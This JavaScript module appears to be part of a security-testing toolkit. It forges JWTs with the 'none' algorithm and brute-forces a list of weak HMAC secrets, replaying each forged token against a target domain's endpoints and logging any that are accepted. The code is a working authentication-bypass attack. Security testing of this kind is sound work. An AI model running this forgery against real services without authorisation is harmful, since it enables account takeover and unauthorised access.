const { httpGet } = require('../lib/http-client');
const { EvidenceManager } = require('../lib/evidence-manager');

class JWTForgeryTester {
  constructor(domain, evidenceDir) {
    this.domain = domain;
    this.evidence = new EvidenceManager(evidenceDir);
    this.results = {
      timestamp: new Date().toISOString(),
      domain,
      tests: [],
      vulnerabilities: []
    };
  }

  async testJWTAlgorithmNone(token) {
    console.log('\nTesting JWT algorithm:none vulnerability');
    
    const decoded = this.decodeJWT(token);
    
    if (!decoded) {
      return { success: false, error: 'Invalid JWT' };
    }

    const forgedHeader = Buffer.from(JSON.stringify({
      alg: 'none',
      typ: 'JWT'
    })).toString('base64').replace(/=/g, '');

    const forgedPayload = Buffer.from(JSON.stringify(decoded.payload))
      .toString('base64').replace(/=/g, '');

    const forgedToken = `${forgedHeader}.${forgedPayload}.`;

    const testResult = {
      type: 'algorithm-none',
      originalToken: token.substring(0, 50) + '...',
      forgedToken: forgedToken.substring(0, 50) + '...',
      decoded: decoded
    };

    this.results.tests.push(testResult);

    return {
      success: true,
      forgedToken,
      testResult
    };
  }

  async testJWTWeakSecret(token, endpoints) {
    console.log('\nTesting JWT with weak secrets');
    
    const weakSecrets = [
      'secret', 'password', '123456', 'admin', 'test',
      'key', 'jwt-secret', 'my-secret', 'changeme'
    ];

    const decoded = this.decodeJWT(token);
    if (!decoded) {
      return { success: false, error: 'Invalid JWT' };
    }

    const results = [];

    for (const secret of weakSecrets) {
      try {
        const forged = await this.forgeJWT(decoded.payload, secret);
        
        for (const endpoint of endpoints) {
          const response = await httpGet(this.domain, endpoint, {
            headers: {
              'Authorization': `Bearer ${forged}`
            }
          });

          if (response.status === 200 && !response.error) {
            const vuln = {
              type: 'jwt-weak-secret',
              severity: 'critical',
              secret,
              endpoint,
              evidence: `Forged JWT accepted with secret: ${secret}`
            };

            this.results.vulnerabilities.push(vuln);
            
            this.evidence.saveEvidence(
              'jwt-weak-secret',
              this.domain,
              endpoint,
              vuln
            );

            results.push({
              secret,
              endpoint,
              success: true,
              response
            });
          }
        }
      } catch (e) {
        continue;
      }
    }

    return results;
  }

  decodeJWT(token) {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) return null;

      const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());

      return { header, payload, signature: parts[2] };
    } catch (e) {
      return null;
    }
  }

  async forgeJWT(payload, secret) {
    const crypto = require('crypto');
    
    const header = { alg: 'HS256', typ: 'JWT' };
    const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64').replace(/=/g, '');
    const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64').replace(/=/g, '');
    
    const signature = crypto
      .createHmac('sha256', secret)
      .update(`${headerB64}.${payloadB64}`)
      .digest('base64')
      .replace(/=/g, '')
      .replace(/\+/g, '-')
      .replace(/\//g, '_');

    return `${headerB64}.${payloadB64}.${signature}`;
  }

  getResults() {
    return this.results;
  }

  saveResults() {
    return this.evidence.saveJson(
      `jwt-forgery-test-${this.domain}-${Date.now()}.json`,
      this.results
    );
  }
}

module.exports = { JWTForgeryTester };
